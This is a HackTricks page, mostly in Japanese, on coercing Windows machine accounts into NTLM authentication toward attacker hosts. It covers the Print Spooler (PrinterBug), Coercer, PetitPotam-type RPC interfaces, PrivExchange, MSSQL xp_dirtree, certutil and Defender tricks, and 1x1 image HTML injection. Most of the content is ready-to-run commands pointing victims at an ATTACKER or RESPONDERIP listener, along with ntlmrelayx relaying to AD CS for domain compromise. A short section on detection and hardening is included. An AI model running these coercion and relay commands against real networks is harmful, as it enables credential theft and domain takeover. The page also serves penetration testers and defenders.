# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party dependencies を回避するために MIDL compiler を使用して C# で coded された **remote authentication triggers** の **collection** です。

## Spooler Service Abuse

_**Print Spooler**_ service が **enabled** の場合、既知の AD credentials を使用して、Domain Controller の print server に新しい print jobs の **update** を **request** し、その notification を **some system** に **send** するよう指示できます。\
printer が notification を arbitrary systems に送信する場合、その system に対して **authenticate against** する必要があります。したがって、attacker は _**Print Spooler**_ service に arbitrary system に対する authenticate を実行させることができ、その authentication では service が **computer account** を **use** します。

Under the hood では、classic **PrinterBug** primitive は **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を **`\\PIPE\\spoolss`** 経由で abuse します。attacker は最初に printer/server handle を open し、`pszLocalMachine` に fake client name を指定します。これにより、target spooler は **attacker-controlled host** への notification channel を作成します。これが、直接的な code execution ではなく、**outbound authentication coercion** となる理由です。<sup>[[2]](#references)</sup>\
spooler 自体の **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。このページは **coercion and relay** に焦点を当てています。

### ドメイン上の Windows Servers の検索

PowerShell を使用して Windows hosts を一覧表示します。Servers は通常、最優先の targets なので、まずそれらに焦点を当てます:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 待ち受け中の Spooler service の検索

@mysmartlogin（Vincent Le Toux）の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を少し改変したものを使用して、Spooler Service が待ち受けているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux では `rpcdump.py` も使用し、**MS-RPRN** protocol を探せます：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
または、Linux から **NetExec/CrackMapExec** を使ってホストをすばやくテストします：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
spooler endpoint が存在するかどうかを確認するだけでなく、**coercion surfaces を列挙**したい場合は、**Coercer scan mode**を使用します。<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
これは、EPM で endpoint を確認しても、print RPC interface が登録されていることしか分からないため有用です。現在の権限であらゆる coercion method に到達できることや、host が利用可能な authentication flow を送信することを**保証するものではありません**。

### 任意の host に対して認証するよう service に要求する

[SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) を compile できます。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) や [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer**を使用すると、spooler interfacesを直接ターゲットにして、どのRPC methodが公開されているかを推測する必要をなくせます。<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Modern RPC-over-TCP callbacks

成功した `RpcRemoteFindFirstPrinterChangeNotificationEx` call が必ず TCP/445 上で traffic を発生させるとは限りません。**Windows 11 22H2 以降では、print communications に RPC over TCP がデフォルトで使用されます**。policy または `RpcUseNamedPipeProtocol=1` によって復元されない限り、RPC over named pipes は無効です。そのため、legacy SMB-only listeners は trigger が送信されたと報告しても、callback を受信できない場合があります。Microsoft は、通常の print RPC では TCP/135（Endpoint Mapper）と dynamic RPC ports が使用されることを documented しており、organizations はこの range を制限したり、fixed print RPC port を選択したりできます。<sup>[[10]](#references)</sup>

Current **Impacket `ntlmrelayx.py`** には RPC relay server と小規模な Endpoint Mapper が含まれており、TCP/135 でデフォルトで有効になっています。この support は、実証された PrinterBug-to-AD-CS chain とともに、2025 年 6 月に merge されました。これにより、victim が SMB/WebDAV に fallback しない場合でも、authenticated RPC callback を relay できます。<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
`Setting up RPC Server on port 135` と `RPCD: Received connection` を relay output で探します。RPC call が予期された error を返すにもかかわらず listener に何も到達しない場合は、victim の print RPC transport policy、outbound filtering、DNS resolution、および別の process がすでに TCP/135 を使用していないかを確認します。また、`ntlmrelayx` が `--no-rpc-server` 付きで起動されていないことも確認してください。

### WebClient で SMB の代わりに HTTP を強制する

**RPC over named pipes**（legacy builds または policy-restored behavior）を引き続き使用している system では、通常の PrinterBug により、`\\attacker\share` への **SMB** authentication が発生します。これは **capture**、**HTTP targets への relay**、または **SMB signing が存在しない環境への relay** に引き続き利用できます。\
ただし、**SMB から SMB への relay** は **SMB signing** によって block されることが多いため、operator は代わりに **HTTP/WebDAV** authentication を強制する場合があります。これは、上記で説明した RPC-over-TCP behavior の fallback ではありません。

target で **WebClient** service が running の場合、Windows が **WebDAV over HTTP** を使用する形式で listener を指定できます：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
これは、**`ntlmrelayx --adcs`** またはその他の HTTP relay targets と組み合わせる場合に特に有用です。強制された接続で SMB relayability に依存する必要がなくなるためです。重要な注意点として、HTTP/WebDAV variant を機能させるには、被害者上で **WebClient が実行中** でなければなりません。

### Unconstrained Delegation との組み合わせ

攻撃者が [Unconstrained Delegation](unconstrained-delegation.md) 用に構成されたコンピューターを侵害している場合、そのコンピューターへ **printer に認証するよう強制** できます。printer computer account の **TGT** は Unconstrained Delegation host のメモリにキャッシュされるため、攻撃者はこれを [Pass the Ticket](pass-the-ticket.md) で取得して再利用できます。

### Detection and hardening notes

印刷を行わない DC、PAW、またはサーバーから PrinterBug を削除する最も確実な方法は、Spooler を停止して無効化することです。印刷が必要な場合は、callback path 上の TCP/445 をブロックすれば十分だと考えるのではなく、考えられるすべての relay destination（SMB server signing、LDAP signing/channel binding、AD CS などの HTTP services 上の EPA）を harden してください。<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detectionでは、MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`への認証済みcall、特にopnum 62/65と、non-localなcallback value、およびspooler hostからの直後のoutbound SMB、HTTP、またはRPC connectionを相関させる必要があります。`\PIPE\spoolss`へのaccessだけでなく、**interface UUID/opnumとsource/destination pairs**をbaseline化してください。現在のprint stackでは、callbackをRPC-over-TCP上に配置できるためです。<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (outbound authをtriggerするinterfaces/opnums)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同じspooler pipe上のasynchronous print interface。指定したhostで到達可能なmethodsをenumerateするにはCoercerを使用します<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (\\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon経由でも使用可能)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Note: これらのmethodsは、UNC path（例: `\\attacker\share`）を運ぶparametersを受け取ります。処理されると、WindowsはそのUNCに対して（machine/user contextで）authenticateするため、NetNTLM captureまたはrelayが可能になります。\
spooler abuseでは、protocol specificationにおいて、serverが`pszLocalMachine`で指定されたclientへのnotification channelを作成すると明記されているため、**MS-RPRN opnum 65**が現在も最も一般的で、最もdocumentedなprimitiveです。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even上のMS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: targetは指定されたbackup log pathをopenし、attackerがcontrolするUNCにauthenticateしようとします。<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.)にNetNTLMをemitさせ、その後AD CS endpoints (ESC8/ESC11 scenarios)またはその他のprivileged servicesにrelayします。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attackは、**Exchange Serverの`PushSubscription` feature**に存在するflawの結果です。このfeatureにより、mailboxを持つ任意のdomain userが、Exchange serverに対して、clientが指定した任意のhostへHTTP経由でauthenticateするよう強制できます。

デフォルトでは、**Exchange serviceはSYSTEMとして実行され**、過剰なprivileges（具体的には、**2019 Cumulative Update以前のdomainに対するWriteDacl privileges**）が付与されています。このflawを悪用すると、情報をLDAPへ**relaying**し、その後domain NTDS databaseをextractできます。LDAPへのrelayingが不可能な場合でも、このflawを使ってdomain内の他のhostsへrelayおよびauthenticateできます。このattackのexploitに成功すると、認証済みの任意のdomain user accountから、直ちにDomain Adminへaccessできます。

## Inside Windows

すでにWindows machine内にいる場合、以下を使用して、privileged accountsでWindowsにserverへconnectionさせることができます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、次の別の technique を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft-signed binary）を使用して、NTLM authentication を強制できます:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

侵害したいマシンにログインするユーザーの **email address** を知っている場合、次のような **1x1 image** を含む **email** を送信するだけでよいでしょう。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
被害者がそれを開くと、Windowsは認証を試みます。

### MitM

MitM攻撃を実行でき、被害者が閲覧するページにHTMLを挿入できる場合は、次のような画像の挿入を試みます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authenticationを強制およびphishするその他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1のクラッキング

[NTLMv1のchallengeをcaptureできる場合は、こちらでクラッキング方法を確認してください](../ntlm/index.html#ntlmv1-attack)。\
_NTLMv1をクラッキングするには、Responderのchallengeを「1122334455667788」に設定する必要があることを忘れないでください_

## References

- [1] [Unit 42 – 認証強制は進化を続ける](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11におけるprintのRPC接続の更新](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayxのRPC relay serverおよびEndpoint Mapper](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
